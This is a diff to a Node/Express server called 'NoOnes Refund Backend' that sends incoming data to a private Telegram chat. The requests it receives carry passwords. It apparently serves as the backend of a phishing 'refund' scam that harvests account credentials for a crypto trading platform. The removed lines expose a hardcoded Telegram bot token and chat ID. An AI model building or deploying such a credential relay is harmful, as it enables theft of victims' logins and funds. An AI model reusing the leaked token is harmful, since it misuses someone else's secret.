@@ -1,7 +1,7 @@
 // ============================================
 // NoOnes Refund Backend Server
 // Telegram Integration | Railway Deployment
-// Port: 5000
+// Port: 5000 (Set in Railway Variables)
 // ============================================
 
 const express = require('express');
@@ -15,11 +15,16 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 
 // ============================================
-// CONFIGURATION
+// CONFIGURATION (from Railway Environment Variables)
 // ============================================
-const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
-const TELEGRAM_CHAT_ID = '7386607055';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+// Check if Telegram config is available
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+  console.warn('⚠️ Telegram credentials not found in environment variables!');
+}
 
 // ============================================
 // MIDDLEWARE
@@ -51,7 +56,12 @@ app.use('/api/', limiter);
 // Logging Middleware
 app.use((req, res, next) => {
   console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
-  console.log('Body:', req.body);
+  if (req.body && Object.keys(req.body).length > 0) {
+    // Don't log passwords in production
+    const safeBody = { ...req.body };
+    if (safeBody.password) safeBody.password = '********';
+    console.log('Body:', safeBody);
+  }
   next();
 });
 
@@ -60,6 +70,11 @@ app.use((req, res, next) => {
 // ============================================
 async function sendToTelegram(message, format = 'HTML') {
   try {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('❌ Telegram credentials not configured');
+      return null;
+    }
+
     const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
@@ -157,7 +172,10 @@ app.get('/', (req, res) => {
     service: 'NoOnes Backend',
     timestamp: new Date().toISOString(),
     version: '1.0.0',
-    port: PORT
+    port: PORT,
+    telegram: {
+      configured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID)
+    }
   });
 });
 
@@ -166,7 +184,10 @@ app.get('/api/health', (req, res) => {
     status: 'healthy',
     uptime: process.uptime(),
     timestamp: new Date().toISOString(),
-    port: PORT
+    port: PORT,
+    telegram: {
+      configured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID)
+    }
   });
 });
 
@@ -338,7 +359,7 @@ app.listen(PORT, '0.0.0.0', () => {
   `);
   console.log(`📡 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}`);
   console.log(`📡 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'}`);
-  console.log(`\n🌐 Server URL: http://localhost:${PORT}`);
+  console.log(`\n🌐 Server URL: https://noonesrefund-production.up.railway.app`);
 });
 
 // ============================================
